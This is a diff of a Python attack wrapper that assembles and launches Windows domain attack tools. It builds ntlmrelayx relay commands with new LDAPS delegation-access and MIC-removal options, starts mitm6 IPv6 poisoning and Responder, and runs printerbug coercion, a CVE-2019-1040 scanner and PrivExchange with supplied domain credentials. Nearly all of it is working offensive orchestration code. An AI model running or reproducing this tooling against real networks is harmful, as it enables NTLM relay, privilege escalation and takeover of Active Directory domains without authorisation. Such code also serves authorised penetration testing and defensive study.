@@ -22,8 +22,17 @@ def create_ntlmrelayx_cmd(args):
         if args.printerbug:
             relay_cmd += ' --remove-mic'
 
+    # Authenticationless PrivExchange
     elif args.httpattack:
-        relay_cmd += f' -t https://{args.exchange_server}/EWS/Exchange.asmx'
+        relay_cmd += f' -t https://{args.server}/EWS/Exchange.asmx'
+
+    # Delegation attacks
+    elif args.delegate or args.delegate_dc:
+        relay_cmd += f' -t ldaps://{args.domain_controller} --delegate-access'
+        if args.delegate:
+            relay_cmd += ' --no-smb-server -wh NetProxy-Service'
+        elif args.delegate_dc:
+            relay_cmd += ' --remove-mic'
 
     # Relay
     else:
@@ -36,7 +45,7 @@ def create_ntlmrelayx_cmd(args):
         relay_cmd += target
 
     if args.mitm6:
-        six_poison = ' -6 -wh NetProxy-Service -wa 2'
+        six_poison = ' -6 -wh NetProxy-Service'
         relay_cmd = relay_cmd + six_poison
 
     if args.command:
@@ -89,31 +98,31 @@ def start_responder(iface, conf):
 def start_mitm6(args):
     cmd = f'python {cwd}/tools/mitm6/mitm6/mitm6.py --ignore-nofqdn'
     if args.domain:
-        cmd = cmd + f' -d {args.domain}'
+        cmd += f' -d {args.domain}'
     if args.interface:
-        cmd = cmd + f' -i {args.interface}'
+        cmd += f' -i {args.interface}'
 
     name = 'mitm6'
     mitm6 = start_process(cmd, name)
 
     return mitm6
 
-def start_exchange_scan(args):
-    if args.exchange_file:
-        with open(args.exchange_file, "r") as f:
+def start_printerbug_scan(args):
+    if args.server_file:
+        with open(args.server_file, "r") as f:
             target = f.readlines()[0].strip()
-        cmd = f"python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file {args.exchange_file} {args.user}@{target}"
+        cmd = f"python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file {args.server_file} {args.user}@{target}"
 
-    elif args.exchange_server:
-        cmd = f"python {cwd}/tools/cve-2019-1040-scanner/scan.py {args.user}@{args.exchange_server}"
+    elif args.server:
+        cmd = f"python {cwd}/tools/cve-2019-1040-scanner/scan.py {args.user}@{args.server}"
 
-    name = "exchange_scanner"
+    name = "printerbug_scanner"
     scan = start_process(cmd, name, live_output=True)
 
     return scan
 
-def start_printerbug(dom_user_passwd, exchange_server, local_ip):
-    cmd = f"python {cwd}/tools/krbrelayx/printerbug.py {dom_user_passwd}@{exchange_server} {local_ip}"
+def start_printerbug(dom_user_pw, attack_server, local_ip):
+    cmd = f"python {cwd}/tools/krbrelayx/printerbug.py {dom_user_pw}@{attack_server} {local_ip}"
     name = 'printerbug'
     printerbug = start_process(cmd, name)
 
@@ -121,7 +130,7 @@ def start_printerbug(dom_user_passwd, exchange_server, local_ip):
 
 def start_privexchange(args, local_ip):
     dom, user, passwd = parse_creds(args)
-    cmd = f'python {cwd}/tools/PrivExchange/privexchange.py -ah {local_ip} -u {user} -p \'{passwd}\' -d {dom} {args.exchange_server}'
+    cmd = f'python {cwd}/tools/PrivExchange/privexchange.py -ah {local_ip} -u {user} -p {passwd} -d {dom} {args.server}'
     name = 'privexchange'
     privexchange = start_process(cmd, name)
     return privexchange
